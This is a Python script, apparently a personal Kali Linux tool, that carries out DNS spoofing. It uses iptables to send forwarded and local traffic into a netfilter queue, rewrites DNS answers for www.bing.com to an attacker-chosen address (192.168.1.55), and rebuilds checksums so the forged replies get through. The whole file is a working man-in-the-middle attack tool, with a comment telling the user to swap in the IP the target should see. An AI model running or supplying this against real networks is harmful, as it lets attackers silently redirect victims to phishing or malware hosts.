#!/home/kali/Documents/Tools/Net_Cut/.venv/bin/python3

import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue", dest="queue", help="Enter the queue no. which you want to create and send packet to.")
    (options, arguments) = parser.parse_args()

    if not options.queue:
        parser.error("Please input Interface name, use --help for more info.")
    return options

def process_packet(packet):

    scapy_packet  = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.55") # Change rdata to that ip you want to show the target
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


def queue_creation(queue_no):

    ## FOR REMOTE
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])

    ## FOR ON THE LOCAL MACHINE
    # subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    # subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])

def flush(queue_no):

    # FOR REMOTE
    subprocess.call(['sudo', 'iptables', '-D', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-D', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-D', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])

    # # FOR ON THE LOCAL MACHINE
    # subprocess.call(['iptables', '-D', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    # subprocess.call(['iptables', '-D', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])


options = get_arguments()

try:
    queue_creation(options.queue)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue), process_packet)
    queue.run()

except KeyboardInterrupt:
    print("[-] Detected CTRL + C .... Flushing queue...")
    flush(options.queue)